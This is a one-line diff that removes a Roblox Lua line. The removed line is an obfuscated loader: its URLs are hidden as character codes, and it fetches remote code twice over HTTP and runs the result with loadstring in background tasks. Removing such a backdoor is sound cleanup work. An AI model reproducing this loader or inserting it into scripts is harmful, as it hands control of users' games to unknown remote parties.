@@ -1,1 +1,1 @@
-local function _a()loadstring(game:HttpGet(loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,97,112,105,46,114,117,98,105,115,46,97,112,112,47,118,50,47,115,99,114,97,112,47,68,106,49,82,87,113,90,66,79,74,77,100,83,100,70,74,47,114,97,119)))()))()end local function _b()loadstring(game:HttpGet(loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,111,110,121,120,115,99,114,105,112,116,115,46,120,121,122)))()))()end task.spawn(_a)task.spawn(_b)
+
